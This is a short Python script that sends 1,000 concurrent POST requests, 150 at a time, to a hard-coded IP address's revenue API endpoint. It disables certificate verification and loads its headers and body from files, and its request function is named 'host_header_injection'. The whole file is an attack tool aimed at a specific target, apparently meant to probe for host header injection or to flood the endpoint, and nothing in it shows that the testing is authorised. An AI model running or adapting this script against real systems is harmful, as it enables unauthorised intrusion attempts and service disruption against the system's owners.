import requests
import json
import concurrent.futures
import time
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define the target URL
target_url = "https://34.160.201.15/api/v1/review/revenue_per_layer"

# Define the total number of requests to send
total_requests = 1000

# Define the number of concurrent requests
concurrent_requests = 150

# Function to read headers from a file
def read_headers_from_file(file_path):
    headers = {}
    with open(file_path, 'r') as file:
        for line in file:
            if ':' in line:
                key, value = line.strip().split(': ', 1)
                headers[key] = value
    return headers

# Function to read body from a file
def read_body_from_file(file_path):
    with open(file_path, 'r') as file:
        body = json.load(file)
    return body

# Function to perform the injection
def host_header_injection(url, headers, body):
    start_time = time.time()
    response = requests.post(url, headers=headers, json=body, verify=False)
    end_time = time.time()
    response_time_ms = (end_time - start_time) * 1000
    # Extract some parts of the response body (e.g., first 100 characters)
    response_body_snippet = response.text[:100]
    return response.status_code, response_time_ms, response_body_snippet

# Read headers and body from the files
headers_file_path = "headers.txt"
body_file_path = "body.txt"
headers = read_headers_from_file(headers_file_path)
body = read_body_from_file(body_file_path)

# Create a thread pool to send requests concurrently
with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
    futures = [executor.submit(host_header_injection, target_url, headers, body) for _ in range(total_requests)]
    for future in concurrent.futures.as_completed(futures):
        status_code, response_time_ms, response_body_snippet = future.result()
        print(f"Response Code: {status_code}, Response Time: {response_time_ms:.2f} ms, Response Snippet: {response_body_snippet}")

